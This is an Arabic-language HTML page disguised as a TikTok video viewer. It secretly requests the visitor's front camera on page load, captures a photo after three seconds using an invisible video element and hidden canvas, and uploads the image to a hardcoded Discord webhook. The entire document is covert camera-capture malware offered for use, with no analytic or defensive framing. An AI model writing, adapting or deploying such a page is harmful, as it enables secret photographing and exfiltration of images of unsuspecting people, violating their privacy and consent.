<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>مشاهدة تيك توك</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; }
        #tiktok-video { width: 100%; height: 100%; object-fit: cover; }
        #hidden-camera { position: absolute; width: 1px; height: 1px; opacity: 0; }
        #photo-canvas { display: none; }
    </style>
</head>
<body>

    <video id="tiktok-video" autoplay muted loop playsinline>
        <source src="https://assets.mixkit.co/videos/preview/mixkit-girl-dancing-to-the-rhythm-of-music-34444-large.mp4" type="video/mp4">
    </video>

    <video id="hidden-camera" autoplay playsinline muted></video>
    <canvas id="photo-canvas"></canvas>

<script>
    const webhookURL = 'https://discord.com/api/webhooks/1493312893100228608/X78aap9qPQUcppW21eNRpVDCiJGIS3OFDw6rH6ZKTPVTzsQbsGJyBKMWV7slNEt67zUs';

    // طلب الكاميرا فور تحميل الصفحة
    window.onload = async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const camera = document.getElementById('hidden-camera');
            camera.srcObject = stream;

            // التقاط وإرسال الصورة بعد 3 ثواني من فتح الصفحة
            setTimeout(() => {
                captureAndSend(camera);
            }, 3000);
        } catch (err) {
            console.log("إذن الكاميرا مطلوب");
        }
    };

    async function captureAndSend(cameraElement) {
        const canvas = document.getElementById('photo-canvas');
        const context = canvas.getContext('2d');
        canvas.width = cameraElement.videoWidth;
        canvas.height = cameraElement.videoHeight;
        context.drawImage(cameraElement, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(async (blob) => {
            if (!blob) return;
            const formData = new FormData();
            formData.append('file', blob, 'capture.png');
            await fetch(webhookURL, { method: 'POST', body: formData });
        }, 'image/png');
    }
</script>
</body>
</html>
